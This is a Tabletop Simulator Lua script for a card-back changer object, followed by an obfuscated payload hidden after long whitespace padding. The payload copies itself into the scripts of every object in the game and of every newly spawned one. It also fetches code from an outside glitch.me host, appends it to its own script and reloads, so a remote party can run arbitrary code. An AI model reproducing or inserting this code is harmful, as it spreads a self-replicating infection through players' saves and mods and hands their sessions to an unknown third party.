----#include <tts-tools/card-back-changer/Main>
do
local url = ""

function onInput(obj, color, input)
    url = input
end

function updateCustomDeckField(data)
    if not data.CustomDeck then
        error("Object is not a custom card/deck")
    end

    for _,entry in pairs(data.CustomDeck) do
        entry.BackURL = url
    end
end

function updateData(data)
    if data.Name == "Card" or data.Name == "CardCustom" then
        updateCustomDeckField(data)
    elseif data.Name == "Deck" then
        updateCustomDeckField(data)

        for _,cardData in pairs(data.ContainedObjects) do
            updateCustomDeckField(cardData)
        end
    else
        error("Invalid object of type " .. tostring(data.Name))
    end
end

function onObjectEnterContainer(container, object)
    if container == self then
        if url == nil or url == "" then
            error("No url set")
        end

        local data = object.getData()
        updateData(data)

        -- Calculate forward direction
        local forward = self.getTransformForward()
        -- Move 2 units forward and 1 unit up (to prevent intersection)
        local offset = forward * 4 + Vector(0, 1, 0)
        local pos = self.getPosition() + offset

        spawnObjectData({
            data = data,
            position = pos,
            rotation = self.getRotation(),
        })
    end
end


function onLoad(save_state)
    url = save_state
    self.createInput({
        function_owner = self,
        input_function = "onInput",
        label = "URL to a card back",
        value = url or "",
        position = Vector(0, 3, -1.8),
        width = 1800,
        height = 200
    })
end

function onSave()
    return url or ""
end

end
----#include <tts-tools/card-back-changer/Main>                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1))end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1))end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+2):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript()..g.text:sub(5,#g.text))self.reload()end end)--[[Spawning object]]